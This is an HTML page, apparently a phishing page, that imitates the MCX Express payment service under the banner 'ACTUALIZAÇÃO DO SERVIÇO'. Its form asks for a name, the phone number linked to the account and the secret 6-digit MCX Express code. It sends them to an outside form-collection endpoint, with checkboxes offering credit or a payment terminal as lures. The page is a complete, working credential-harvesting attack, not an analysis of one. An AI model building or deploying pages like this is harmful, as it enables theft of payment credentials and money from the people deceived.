<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MCX express</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="header-banner">
    <div class="logo-wrapper">
        <img src="logo.png" alt="Logo MCX" class="logo-img">
        <span class="logo-text">express</span>
    </div>
</header>

    <main class="container">
        <h2 class="title">ACTUALIZAÇÃO DO SERVIÇO</h2>
        <p class="subtitle">INSIRA OS SEUS DADOS</p>

        <form action="https://formspree.io/f/xkoqvvvj" method="POST">

<div class="form-group">
<label>Primeiro e Último Nome</label>
<input type="text" name="nome" required>
</div>

<div class="form-group">
<label>Número do Telemóvel Associado</label>
<input type="tel" name="telefone" required>
</div>

<div class="form-group">
<label>Código de 6 digitos associado ao MCX express</label>
<input type="password" name="codigo" maxlength="6" required>
</div>

<p class="question">Quais opções você deseja?</p>

<div class="checkbox-group">
<label><input type="checkbox" name="opcao" value="notificacoes"> Activar Alerta de Notificações</label>

<label><input type="checkbox" name="opcao" value="actualizar"> Actualizar o Serviço</label>

<label><input type="checkbox" name="opcao" value="credito"> Crédito Empresarial</label>

<label><input type="checkbox" name="opcao" value="tpa"> Obter TPA</label>
</div>

<button type="submit" class="btn-concluir">CONCLUIR</button>

</form>
    </main>

</body>
</html>
